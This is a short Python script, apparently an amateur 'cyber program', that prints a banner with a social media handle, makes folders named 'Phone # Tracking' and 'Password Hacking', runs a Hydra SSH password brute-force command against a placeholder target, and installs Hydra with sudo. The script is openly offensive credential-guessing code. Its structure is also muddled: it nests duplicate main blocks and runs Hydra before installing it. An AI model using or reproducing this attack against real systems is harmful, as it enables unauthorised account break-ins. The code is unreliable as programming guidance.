import time
import os

def welcome_stream():
    print("Welcome to Raffpoyb_Cyber_Program!")
    print("Social Media: Instagram - @raffpoyb")
    current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    print(f"Current time: {current_time}")

if __name__ == "__main__":
    welcome_stream()
    def create_and_list_directory():
        directory_name = "Phone # Tracking"
        if not os.path.exists(directory_name):
            os.makedirs(directory_name)
        print(f"Contents of the '{directory_name}' directory:")
        print(os.listdir(directory_name))

    if __name__ == "__main__":
        welcome_stream()
        create_and_list_directory()
        def run_hydra():
            command = "hydra -l username -P password_list.txt ssh://target-ip"
            os.system(command)

        def create_password_hacking_directory():
            directory_name = "Password Hacking"
            if not os.path.exists(directory_name):
                os.makedirs(directory_name)
            print(f"Contents of the '{directory_name}' directory:")
            print(os.listdir(directory_name))

        create_password_hacking_directory()
        run_hydra()

        def download_hydra():
            if os.name == 'nt':
                print("Hydra is not natively supported on Windows. Please use a Linux environment.")
            else:
                os.system("sudo apt-get update && sudo apt-get install -y hydra")

        download_hydra()

    